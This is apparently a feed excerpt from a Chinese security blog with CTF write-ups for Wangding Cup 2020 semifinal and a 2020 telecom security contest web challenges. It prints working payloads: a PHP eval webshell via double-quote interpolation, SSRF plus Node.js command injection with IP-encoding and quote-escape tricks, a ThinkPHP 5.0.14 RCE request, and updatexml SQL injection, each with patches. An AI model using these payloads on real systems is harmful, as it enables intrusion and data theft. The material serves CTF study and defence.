$f2=<span class="string">'private/'</span>.<span class="keyword">$this</span>-&gt;random_code(<span class="number">10</span>).<span class="string">".php"</span>;</div><div class="line"></div><div class="line">   $stream_f1 = fopen($f1, <span class="string">'w+'</span>);</div><div class="line"></div><div class="line">   fwrite($stream_f1, $content);</div><div class="line">   rewind($stream_f1);</div><div class="line">   $f1_read=fread($stream_f1, <span class="number">3000</span>);</div><div class="line">   </div><div class="line">   preg_match(<span class="string">'/^&lt;\?php \$_GET\[\"password\"\]===\"[a-zA-Z0-9]&#123;8&#125;\"\?print\(\".*\"\):exit\(\); $/s'</span>, $f1_read, $matches);</div><div class="line">   </div><div class="line">   <span class="keyword">if</span>(!<span class="keyword">empty</span>($matches[<span class="number">0</span>]))&#123;</div><div class="line">      copy($f1,$f2);</div><div class="line">      fclose($stream_f1);   </div><div class="line">      <span class="keyword">return</span> $f2;     </div><div class="line">   &#125;<span class="keyword">else</span>&#123;</div><div class="line">      fwrite($stream_f1, <span class="string">'&lt;?php exit(); ?&gt;'</span>);</div><div class="line">      fclose($stream_f1);</div><div class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_create</span><span class="params">($password, $content)</span></span>&#123;</div><div class="line">   $_content=<span class="string">'&lt;?php $_GET["password"]==="'</span>.$password.<span class="string">'"?print("'</span>.$content.<span class="string">'"):exit(); '</span>;</div><div class="line">   <span class="keyword">return</span> $_content;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">random_code</span><span class="params">($length = <span class="number">8</span>,$chars = null)</span></span>&#123;</div><div class="line">   <span class="keyword">if</span>(<span class="keyword">empty</span>($chars))&#123;</div><div class="line">       $chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</div><div class="line">   &#125;</div><div class="line">   $count = strlen($chars) - <span class="number">1</span>;</div><div class="line">   $code = <span class="string">''</span>;</div><div class="line">   <span class="keyword">while</span>( strlen($code) &lt; $length)&#123;</div><div class="line">      $code .= substr($chars,rand(<span class="number">0</span>,$count),<span class="number">1</span>);</div><div class="line">   &#125;</div><div class="line">   <span class="keyword">return</span> $code;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这段代码大概就是把<code>$content</code>变量的内容写入php文件，之后设置随机密码，但是写入之前单引号双引号被<code>htmlspecialchars</code>函数转义了，不能闭合<code>print</code>函数，并且这里还存在正则检测，会对写入的代码进行匹配。但是这里<code>print</code>函数打印<code>$content</code>变量用的是双引号，于是通过php当中双引号可以解析变量的特性就可以进行绕过</p><p>可以通过<code>${phpcode}</code>这种方式去执行<code>phpcode</code>代码部分</p><p>首先上传txt，内容传入<code>${@eval($_GET[1])};</code></p><p><img src="http://pic.c1imber.top/blog/20201214/viCwP3qSoeUY.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20201214/igz18J5ruDJz.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20201214/9wzAt3fOioUx.png?imageslim" alt="mark"></p><p>然后对txt进行备份，这里/private/vrKJjXTDVw.php写入的内容就变成了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $_GET[<span class="string">"password"</span>]===<span class="string">"f1jUc24l"</span>?<span class="keyword">print</span>(<span class="string">"$&#123;@eval($_GET[1])&#125;;"</span>):<span class="keyword">exit</span>();</div></pre></td></tr></table></figure><p>因为<code>print</code>的双引号可以解析变量，所以这里构造的php代码并不是被<code>print</code>函数输出，而是被执行了</p><p>获取flag</p><pre><code>http://172.16.9.23:9014/private/vrKJjXTDVw.php?password=f1jUc24l&amp;1=system(%27cat%20/flag%27);</code></pre><p><img src="http://pic.c1imber.top/blog/20201214/G8JKJhW6OmLi.png?imageslim" alt="mark"></p><p><strong>patch：</strong></p><p>第56行，修改为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$_content=<span class="string">"&lt;?php $_GET['password']==='"</span>.$password.<span class="string">"'?print('"</span>.$content.<span class="string">"'):exit(); "</span>;</div></pre></td></tr></table></figure><p>这里把<code>print</code>函数的双引号换成了单引号，防止变量被解析</p><p>然后需要修改正则，第41行，修改为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_match(<span class="string">"/^&lt;\?php \$_GET\[\'password\'\]===\'[a-zA-Z0-9]&#123;8&#125;\'\?print\(\'.*\'\):exit\(\); $/s"</span>, $f1_read, $matches);</div></pre></td></tr></table></figure><h3 id="vulnfaces"><a href="#vulnfaces" class="headerlink" title="vulnfaces"></a>vulnfaces</h3><p>完全没思路的一道题，赛后百度了一下才知道题目环境用的是RichFaces，应该是CVE-2018-12533（EL表达式注入），但是有过滤，绕不过去，有时间要好好研究一下，填个坑</p><p>web题目现在在BUUCTF（<a href="https://buuoj.cn/challenges）平台上都有了，没有代码无法搭环境学习复现的同学，可以去这个平台上做" target="_blank" rel="external">https://buuoj.cn/challenges）平台上都有了，没有代码无法搭环境学习复现的同学，可以去这个平台上做</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;game-exp&quot;&gt;&lt;a href=&quot;#game-exp&quot; class=&quot;headerlink&quot; title=&quot;game_exp&quot;&gt;&lt;/a&gt;game_exp&lt;/h3&gt;&lt;p&gt;漏洞一：phar反序列化&lt;/p&gt;
&lt;p&gt;regiter.php当中第3行-第9行：&lt;/p&gt;

      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯半决赛web题</title>
    <link href="https://c1aysec.github.io/2020/12/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9Bweb%E9%A2%98/"/>
    <id>https://c1aysec.github.io/2020/12/14/2020网鼎杯半决赛web题/</id>
    <published>2020-12-13T16:02:46.922Z</published>
    <updated>2021-01-15T06:48:27.617Z</updated>
    
    <content type="html"><![CDATA[<h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>第一次参加网鼎杯线下，由于太忙，这篇文章晚了一些，这次网鼎的赛制不同于以往线下的AWD模式，而是以一种AWD Plus的模式。</p><h3 id="AWD-Plus规则简述"><a href="#AWD-Plus规则简述" class="headerlink" title="AWD Plus规则简述"></a>AWD Plus规则简述</h3><p>每个队伍会有相同的靶机和题目源码，得分分值分为攻击分值和防御分值两部分，攻击分值就是选手需要先找到靶机存在的漏洞，然后通过构造可以利用成功的exp获取靶机的flag提交获取的分值，防御分值是选手需要提交相应的修复代码给平台，平台每隔一段时间会自动对赛场选手的靶机进行攻击，被平台攻击成功的队伍获取flag的队伍会失去防御分值，反之，防御成功就会获得相应的防御分值，还有一点需要注意的就是选手提交的修复代码不能导致靶机环境服务异常，否则会有异常扣分。</p><p>通过规则可以看到该赛制其实是一种ctf线上赛+一些AWD元素的模式，和AWD相比少了选手之间的攻击和权限维持等元素</p><p>下面说一下题目（部分web题目因为题目原因或者是自己还没有掌握，暂时先放一放，回头再填坑）</p><h3 id="AliceWebsite"><a href="#AliceWebsite" class="headerlink" title="AliceWebsite"></a>AliceWebsite</h3><p>index.php第30行，很明显的文件包含</p><p><img src="http://pic.c1imber.top/blog/20201214/lQpxVsgOeOWy.png?imageslim" alt="mark"></p><p>获取flag，忘记截图了</p><p><a href="http://172.16.9.13:9002/index.php?action=/flag" target="_blank" rel="external">http://172.16.9.13:9002/index.php?action=/flag</a></p><p>flag{885e4f3b-5f02-454c-ba8d-dbbb6d77c7be}</p><p><strong>patch</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$action = (<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) ? $_GET[<span class="string">'action'</span>] : <span class="string">'home.php'</span>);</div><div class="line">$file = dirname(<span class="keyword">__FILE__</span>).<span class="string">"/"</span>.pathinfo($action)[<span class="string">"filename"</span>].<span class="string">".php"</span>;</div><div class="line"><span class="keyword">if</span> (file_exists($action)) &#123;</div><div class="line">    <span class="keyword">include</span> $file;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"File not found!"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><h3 id="babyjs"><a href="#babyjs" class="headerlink" title="babyjs"></a>babyjs</h3><p>主要考察：</p><p>1、ssrf绕过</p><p>2、node.js url.parse函数解析url的一些特性而导致的一些绕过方法</p><p>题目代码，看路由文件：routes/index.js，可以看到是nodejs代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</div><div class="line"><span class="keyword">var</span> config = <span class="built_in">require</span>(<span class="string">'../config'</span>);</div><div class="line"><span class="keyword">var</span> url=<span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line"><span class="keyword">var</span> child_process=<span class="built_in">require</span>(<span class="string">'child_process'</span>);</div><div class="line"><span class="keyword">var</span> fs=<span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"><span class="keyword">var</span> request=<span class="built_in">require</span>(<span class="string">'request'</span>);</div><div class="line"><span class="keyword">var</span> router = express.Router();</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">var</span> blacklist=[<span class="string">'127.0.0.1.xip.io'</span>,<span class="string">'::ffff:127.0.0.1'</span>,<span class="string">'127.0.0.1'</span>,<span class="string">'0'</span>,<span class="string">'localhost'</span>,<span class="string">'0.0.0.0'</span>,<span class="string">'[::1]'</span>,<span class="string">'::1'</span>];</div><div class="line"></div><div class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</div><div class="line">    res.json(&#123;&#125;);</div><div class="line">&#125;);</div><div class="line"></div><div class="line">router.get(<span class="string">'/debug'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(req.ip);</div><div class="line">    <span class="keyword">if</span>(blacklist.indexOf(req.ip)!=<span class="number">-1</span>)&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'res'</span>);</div><div class="line"><span class="keyword">var</span> u=req.query.url.replace(<span class="regexp">/[\"\']/ig</span>,<span class="string">''</span>);</div><div class="line"><span class="built_in">console</span>.log(url.parse(u).href);</div><div class="line"><span class="keyword">let</span> log=<span class="string">`echo  '<span class="subst">$&#123;url.parse(u).href&#125;</span>'&gt;&gt;/tmp/log`</span>;</div><div class="line"><span class="built_in">console</span>.log(log);</div><div class="line">child_process.exec(log);</div><div class="line">res.json(&#123;<span class="attr">data</span>:fs.readFileSync(<span class="string">'/tmp/log'</span>).toString()&#125;);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        res.json(&#123;&#125;);</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line"></div><div class="line">router.post(<span class="string">'/debug'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(req.body);</div><div class="line">    <span class="keyword">if</span>(req.body.url !== <span class="literal">undefined</span>) &#123;</div><div class="line">        <span class="keyword">var</span> u = req.body.url;</div><div class="line"><span class="keyword">var</span> urlObject=url.parse(u);</div><div class="line"><span class="keyword">if</span>(blacklist.indexOf(urlObject.hostname) == <span class="number">-1</span>)&#123;</div><div class="line"><span class="keyword">var</span> dest=urlObject.href;</div><div class="line">request(dest,(err,result,body)=&gt;&#123;</div><div class="line">res.json(body);</div><div class="line">&#125;)</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">res.json([]);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = router;</div></pre></td></tr></table></figure><p>大致读一遍代码：</p><p>首先在blacklist数组当中设置了一些不同格式的内网ip，然后是三条路由</p><p>先看<code>router.get(&#39;/debug&#39;, function(req, res, next)</code>，这里对<code>req.ip</code>进行了检查，要求<code>req.ip</code>的值必须在<code>blacklist</code>数组当中，不然请求过去会直接返回空<code>{}</code>，之后使用<code>req.query.url</code>接收get方式传入的url参数，将url参数值当中的单双引号替换成空后赋值给变量u，之后通过<code>url.parse(u).href</code>解析出url值当中的href，之后就是拼接为<code>echo  &#39;${url.parse(u).href}&#39;&gt;&gt;/tmp/log</code>这题命令，执行，之后返回/tmp/log当中写入的内容，简单来说就是把get传入的url参数当中的href部分写入/tmp/log，然后输出</p><p>这里的<code>req.ip</code>指的是request请求的原始源ip，也就是remoteAddress，可以理解成php当中的<code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>。所以这里直接以get方式请求/debug是不行的，均会返回<code>{}</code>，这里需要<code>req.ip</code>的值为<code>blacklist</code>当中的本地ip，到了这里大概可以看出是需要找一个ssrf</p><p>第一步：绕内网ip</p><p>提一下常见的方法：</p><pre><code>localhost特殊域名： 127.0.0.1.xip.ioip 8进制格式：127.0.0.1-&gt; 0177.0.0.1ip 16进制格式：127.0.0.1-&gt;0x7f.0.0.1ip 10进制整数格式：127.0.0.1-&gt;2130706433ip 16进制整数格式：127.0.0.1-&gt;0x7F000001ipv6: 0:0:0:0:0:0:7f00:01、0:0:0:0:0:0:0:1、::1、ip6-localhost、x.1.ip6.name简写： 127.0.0.1-&gt;127.1、00.0.0.0等</code></pre><p>因为是黑名单，绕过方法有很多，这里使用ip进制转换的格式就能绕过</p><p>第二步：命令执行逃逸引号</p><p>因为在<code>router.get(&#39;/debug&#39;, function(req, res, next)</code>当中，将<code>req.query.url</code>当中的单双引号删除了，导致不能闭合引号执行命令，需要进行绕过</p><p>这里需要用到<code>url.parse()</code>函数解析url的一些特性去进行绕过</p><p>url格式：</p><pre><code>scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]</code></pre><p>经过测试，发现<code>url.parse()</code>在解析url的时候，<code>[user[:password]</code>部分会自动进行url解码，利用这个特性就可以逃逸引号进行命令注入</p><p>本地测试demo</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> url=<span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line">u=<span class="string">"http://u%27:p%27@127.0.0.1%27:80%27/path%27?a%27=b%27#c%27"</span>;</div><div class="line"><span class="built_in">console</span>.log(url.parse(u));</div></pre></td></tr></table></figure><p>结果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Url &#123;</div><div class="line">  protocol: <span class="string">'http:'</span>,</div><div class="line">  slashes: <span class="literal">true</span>,</div><div class="line">  auth: <span class="string">'u\':p\''</span>,</div><div class="line">  host: <span class="string">'127.0.0.1'</span>,</div><div class="line">  port: <span class="literal">null</span>,</div><div class="line">  hostname: <span class="string">'127.0.0.1'</span>,</div><div class="line">  hash: <span class="string">'#c%27'</span>,</div><div class="line">  search: <span class="string">'?a%27=b%27'</span>,</div><div class="line">  query: <span class="string">'a%27=b%27'</span>,</div><div class="line">  pathname: <span class="string">'%27:80%27/path%27'</span>,</div><div class="line">  path: <span class="string">'%27:80%27/path%27?a%27=b%27'</span>,</div><div class="line">  href: <span class="string">'http://u\':p\'@127.0.0.1/%27:80%27/path%27?a%27=b%27#c%27'</span> &#125;</div></pre></td></tr></table></figure><p>可以看到auth和href部分的单引号内容被自动url解码了，而其它位置均不能被url解码</p><p>scheme部分当中如果有url编码，不光不会被url解码，还会变成下面这样，识别不到<code>[user[:password]</code>部分</p><p><img src="http://pic.c1imber.top/blog/20201214/awkjFjiOfB57.png?imageslim" alt="mark"></p><p>上面只是简单的例子，然而实际上<code>url.parse()</code>解析url是非常复杂的，可以看下面的例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> url=<span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line">u=<span class="string">"aaa://%21%22%23%24%25%26%5c%27%28%29%2a%2b%2c%2d%2e%2f%30%31%32%33%34%35%36%37%38%39%3a%3b%3c%3d%3e%3f%40%41%42%43%44%45%46%47%48%49%4a%4b%4c%4d%4e%4f%50%51%52%53%54%55%56%57%58%59%5a%5b%5c%5c%5d%5e%5f%60%61%62%63%64%65%66%67%68%69%6a%6b%6c%6d%6e%6f%70%71%72%73%74%75%76%77%78%79%7a%7b%7c%7d%7e@11!$#%&amp;()*+,-.01@23456789&lt;=&gt;ABCDEFGHIJKLM NOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz&#123;&#125;|#111"</span>;</div><div class="line"><span class="built_in">console</span>.log(url.parse(u));</div></pre></td></tr></table></figure><p>结果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">Url &#123;</div><div class="line">  protocol: <span class="string">'aaa:'</span>,</div><div class="line">  slashes: <span class="literal">true</span>,</div><div class="line">  auth:</div><div class="line">   <span class="string">'!"#$%&amp;\\\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~'</span>,</div><div class="line">  host: <span class="string">'11'</span>,</div><div class="line">  port: <span class="literal">null</span>,</div><div class="line">  hostname: <span class="string">'11'</span>,</div><div class="line">  hash:</div><div class="line">   <span class="string">'#%&amp;()*+,-.01@23456789%3C=%3EABCDEFGHIJKLM%20NOPQRSTUVWXYZ[]%5E_%60abcdefghijklmnopqrstuvwxyz%7B%7D%7C#111'</span>,</div><div class="line">  search: <span class="literal">null</span>,</div><div class="line">  query: <span class="literal">null</span>,</div><div class="line">  pathname: <span class="string">'/!$'</span>,</div><div class="line">  path: <span class="string">'/!$'</span>,</div><div class="line">  href:</div><div class="line">   <span class="string">'aaa://!%22%23%24%25%26%5C\'()*%2B%2C-.%2F0123456789:%3B%3C%3D%3E%3F%40ABCDEFGHIJKLMNOPQRSTUVWXYZ%5B%5C%5C%5D%5E_%60abcdefghijklmnopqrstuvwxyz%7B%7C%7D~@11/!$#%&amp;()*+,-.01@23456789%3C=%3EABCDEFGHIJKLM%20NOPQRSTUVWXYZ[]%5E_%60abcdefghijklmnopqrstuvwxyz%7B%7D%7C#111'</span> &#125;</div></pre></td></tr></table></figure><p>可以看到解析出的href当中第一个@字符前面的部分，只有<code>!&#39;()*-.:_~和数字大小写字母</code>会被url解码，或者可以理解成除了这些字符外，auth部分的其它字符都会被url编码，而第一个@字符后的内容，<code>&lt;&gt;空格^`{|}</code>这些字符都会被url编码，所以这里即使逃逸出了单引号，想要实现命令注入依旧很困难</p><p>说一下两个不那么完美的方法<br>方法一，使用cp命令：</p><pre><code>POST /debugurl=http://2130706433/debug?url=http://%2525271@123$(cp$IFS/flag$IFS/tmp/log)%2526%2523</code></pre><p><img src="http://pic.c1imber.top/blog/20201214/5oc688atcwOc.png?imageslim" alt="mark"></p><p>实际上执行的命令为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span>  <span class="string">'http://'</span>1@123/$(cp<span class="variable">$IFS</span>/flag<span class="variable">$IFS</span>/tmp/<span class="built_in">log</span>)&amp;<span class="comment">#'&gt;&gt;/tmp/log</span></div></pre></td></tr></table></figure><p>缺陷：只能读取文件</p><p>方法二，使用script命令：</p><p><a href="https://www.cnblogs.com/shineriver/p/10922970.html" target="_blank" rel="external">https://www.cnblogs.com/shineriver/p/10922970.html</a></p><pre><code>POST /debugurl=http://2130706433/debug?url=http://%2525271@123$(script$IFS-cwhoami$IFS-a$IFS/tmp/log)%2526%2523</code></pre><p><img src="http://pic.c1imber.top/blog/20201214/kl0sUnD01TM8.png?imageslim" alt="mark"></p><pre><code>POST /debugurl=http://2130706433/debug?url=http://%2525271@123$(script$IFS-cls$IFS-a$IFS/tmp/log)%2526%2523</code></pre><p><img src="http://pic.c1imber.top/blog/20201214/89PlduqqQl5w.png?imageslim" alt="mark"></p><p>缺陷：可以执行命令，但是执行的命令当中不能有空格，所以不能ls /、cat /flag这样去直接读flag文件</p><p>这道题可以直接用第一种方法读取/flag</p><p><img src="http://pic.c1imber.top/blog/20201214/bFfUp2lxjv8d.png?imageslim" alt="mark"></p><p>之所以这么麻烦其实是因为不能出网，不然逃逸出引号后可以直接通过远程下载sh脚本执行的方式去执行任意命令了，这里的环境下使用文件重定向的限制实在是太多。。。</p><p><strong>patch</strong></p><p>第20行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> u=req.query.url.replace(<span class="regexp">/[\"\']/ig</span>,<span class="string">''</span>);</div></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> u=req.query.url.replace(<span class="regexp">/[\"\'%27]/ig</span>,<span class="string">''</span>);</div></pre></td></tr></table></figure><p>防止被url编码绕过</p><h3 id="faka"><a href="#faka" class="headerlink" title="faka"></a>faka</h3><p>预期解应该是前台thinkphp rce（该题目使用的版本为thinkphp 5.0.14），题目分析先暂时放一下，有时间单独写篇文章</p><pre><code>POST /index.php_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=cat /flag.txt</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h3&gt;&lt;p&gt;第一次参加网鼎杯线下，由于太忙，这篇文章晚了一些，这次网鼎的赛制不同于以往线下的AWD模式，而是以一种AWD Plus的模式。&lt;/p&gt;
&lt;h3 id
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020全国电信和互联网行业网络安全竞赛wp</title>
    <link href="https://c1aysec.github.io/2020/12/07/2020%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bwp/"/>
    <id>https://c1aysec.github.io/2020/12/07/2020全国电信和互联网行业网络安全竞赛wp/</id>
    <published>2020-12-07T09:24:36.060Z</published>
    <updated>2020-12-08T04:45:26.907Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p>补一下，11月份的比赛，太忙一直没时间更新</p><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>很明显的注入，但是过滤了一些关键字，比如information、sys等，导致获取不到表名</p><p>通过：</p><pre><code>uname=1&apos;) and updatexml(1,concat(0x3a,(select * from flag)),1);-- -&amp;passwd=1</code></pre><p>可以发现存在名为flag表，并且可以获取到里面的数据</p><p><img src="http://pic.c1imber.top/blog/20201207/ATMFj13IU8MU.png?imageslim" alt="mark"></p><p>但是updatexml这种报错注入方式显示的信息有长度限制，而且这里不知道flag表当中flag的列名，关于无列名注入的问题，直接用子查询就能绕过</p><p>获取完整的flag:</p><pre><code>uname=1&apos;) and updatexml(1,concat(0x3a,(select x.1 from (select * from (select 1)a union select * from flag limit 1,1)x)),1);-- -&amp;passwd=1</code></pre><p><img src="http://pic.c1imber.top/blog/20201207/mt78Vtm8W73S.png?imageslim" alt="mark"></p><pre><code>uname=1&apos;) and updatexml(1,concat(0x3a,(select substr(x.1,32) from (select * from (select 1)a union select * from flag limit 1,1)x)),1);-- -&amp;passwd=1</code></pre><p><img src="http://pic.c1imber.top/blog/20201207/AkK4A2mQk6U5.png?imageslim" alt="mark"></p><p>拼接获得完整的flag:</p><p>flag{c7651cb673c911ee8f9977094a220f17}</p><h3 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h3><p>通过<a href="http://121.36.224.156:2333/?hint可以查看提示的代码" target="_blank" rel="external">http://121.36.224.156:2333/?hint可以查看提示的代码</a>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"> <span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//a "part" of the source code here  </span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqlWaf</span><span class="params">($s)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $filter = <span class="string">'/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|&gt;|&lt;|;|"|\^|\||\ |\'/i'</span>;</div><div class="line">    <span class="keyword">if</span> (preg_match($filter,$s))</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span>;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">True</span>;</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'VerifyCode'</span>]))</div><div class="line">            <span class="keyword">die</span>(<span class="string">"?"</span>);   </div><div class="line"></div><div class="line">    $username = strval($_POST[<span class="string">'username'</span>]);</div><div class="line">    $password = strval($_POST[<span class="string">'password'</span>]); </div><div class="line"></div><div class="line">    <span class="keyword">if</span> ( !sqlWaf($password) )</div><div class="line">        alertMes(<span class="string">'damn hacker'</span> ,<span class="string">"./index.php"</span>); </div><div class="line"></div><div class="line">    $sql = <span class="string">"SELECT * FROM users WHERE username='$&#123;username&#125;' AND password= '$&#123;password&#125;'"</span>;</div><div class="line"><span class="comment">//    password format: /[A-Za-z0-9]/</span></div><div class="line">    $result = $conn-&gt;query($sql);</div><div class="line">    <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</div><div class="line">        $row = $result-&gt;fetch_assoc();</div><div class="line">        <span class="keyword">if</span> ( $row[<span class="string">'username'</span>] === <span class="string">'admin'</span> &amp;&amp; $row[<span class="string">'password'</span>] )</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> ($row[<span class="string">'password'</span>] == $password)</div><div class="line">            &#123;</div><div class="line">                $message = $FLAG;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                $message = <span class="string">"username or password wrong, are you admin?"</span>;</div><div class="line">            